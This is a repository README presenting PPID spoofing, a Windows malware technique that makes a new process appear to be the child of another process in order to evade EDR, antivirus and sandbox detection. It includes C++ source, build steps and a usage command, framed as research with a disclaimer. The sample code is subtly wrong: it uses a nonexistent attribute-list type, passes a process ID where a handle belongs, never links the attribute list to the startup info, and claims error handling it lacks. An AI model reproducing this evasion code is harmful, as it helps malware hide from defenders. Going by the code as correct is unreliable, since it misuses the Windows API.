# PPID Spoofing
## [![Typing SVG](https://readme-typing-svg.demolab.com?font=JetBrains+Mono&weight=2000&pause=1000&width=435&lines=Welcome+to+PPID+Spoofing+Malware+Technique!!!;Emplemanting+Process+Parent+ID+Spoofing+in+C++;Bypass+Detection+Mechanisms;For+Research+Purposes+Only)](https://git.io/typing-svg)

## Overview

Welcome to the **PPID Spoofing** repository! This project demonstrates a technique used to manipulate the Process Parent ID (PPID) of newly created processes. By spoofing the PPID, malicious processes can blend in with legitimate processes, bypassing detection mechanisms employed by security solutions such as EDRs, AVs, and sandboxes.

This repository serves as a practical guide and educational resource to learn how PPID spoofing works, along with sample code for implementation.

**Disclaimer**: This code is intended for Research purposes only. Any malicious use is strictly prohibited.

## Table of Contents

- [Overview](#overview)
- [How It Works](#how-it-works)
- [Code Walkthrough](#code-walkthrough)
- [Installation](#installation)
- [Usage](#usage)
- [Contributing](#contributing)
- [Disclaimer](#disclaimer)
- [License](#license)

## How It Works

PPID spoofing allows you to change the parent process of a newly created process, making it appear as though it is a child of an existing process. This technique can be used to bypass security detection that relies on parent-child relationships to identify suspicious processes.

The process is implemented using the Windows API:

1. **Set Extended Startup Info**: We initialize extended process attributes with `EXTENDED_STARTUPINFO_PRESENT`.
2. **Prepare Attribute List**: Using `InitializeProcThreadAttributeList`, we create an attribute list for the process.
3. **Update Parent Process Attribute**: With `UpdateProcThreadAttribute`, we set the PPID of the new process to that of the parent process we wish to spoof.
4. **Create Process**: Finally, `CreateProcessA` is used to launch the new process with the spoofed PPID.

---

## Code Walkthrough

The main function for PPID spoofing is `CreatePPidSpoofedProcess`. Here's a breakdown of how it works:

### Function: `CreatePPidSpoofedProcess`

```cpp
BOOL CreatePPidSpoofedProcess(
    DWORD hParentProcess, 
    LPCSTR lpProcessName, 
    LPDWORD dwProcessId, 
    PHANDLE hProcess, 
    PHANDLE hThread)
{
    // Prepare the necessary data structures
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));

    // Initialize extended process attributes
    PROCESS_ATTRIBUTE_LIST attributes;
    InitializeProcThreadAttributeList(&attributes, 1, 0);

    // Set parent process (PPID) attribute
    UpdateProcThreadAttribute(&attributes, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(hParentProcess));

    // Create the process with the spoofed PPID
    if (CreateProcessA(
            lpProcessName, 
            NULL, 
            NULL, 
            NULL, 
            FALSE, 
            EXTENDED_STARTUPINFO_PRESENT, 
            NULL, 
            NULL, 
            &si, 
            &pi))
    {
        *dwProcessId = pi.dwProcessId;
        *hProcess = pi.hProcess;
        *hThread = pi.hThread;
        return TRUE;
    }
    return FALSE;
}
```

### Key Points:
- **Inputs**:
  - `hParentProcess`: A handle to the parent process whose ID we want to spoof.
  - `lpProcessName`: The name of the process to launch with the spoofed PPID.
  
- **Outputs**:
  - `dwProcessId`: Process ID of the created process.
  - `hProcess`: Handle to the created process.
  - `hThread`: Handle to the primary thread of the created process.

The function initializes the required attributes, updates the PPID, and launches the new process. It includes error handling to ensure robustness.

---

## Installation

### Prerequisites

- Windows development environment (e.g., Visual Studio)
- Basic knowledge of Windows APIs and process creation

### Steps

1. **Clone the Repository**:
   ```bash
   git clone https://github.com/YourUsername/PPID-Spoofing.git
   ```

2. **Open the Solution**:
   - Open `PPID-Spoofing.sln` in Visual Studio.

3. **Build the Solution**:
   - Set the configuration to `Release` or `Debug`.
   - Compile the solution.

4. **Run the Executables**:
   - Execute the compiled binary to test the PPID spoofing functionality.

---

## Usage

1. **Run the executable**:
   - Launch the executable from the command line, passing the target parent process ID as an argument:
   
   ```bash
   PPID-Spoofing.exe <ParentProcessID>
   ```

   Example:
   ```bash
   PPID-Spoofing.exe 1234
   ```

   This will spawn a process (`RuntimeBroker.exe`) with the specified PPID (1234).

2. **Verify Parent-Child Relationship**:
   - Use tools like Task Manager or Process Explorer to verify that the newly created process is associated with the spoofed parent process.

---

## Contributing

Contributions are welcome! If you have additional techniques or improvements to existing ones, feel free to submit a pull request. Please ensure your contributions adhere to ethical guidelines and are intended for educational and research purposes only.

---

## Disclaimer

This repository is for **Research and educational purposes only**. The techniques demonstrated here aim to educate security professionals on understanding and defending against such tactics. **Misuse of this information is strictly prohibited** and not supported by the author.

---

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
```
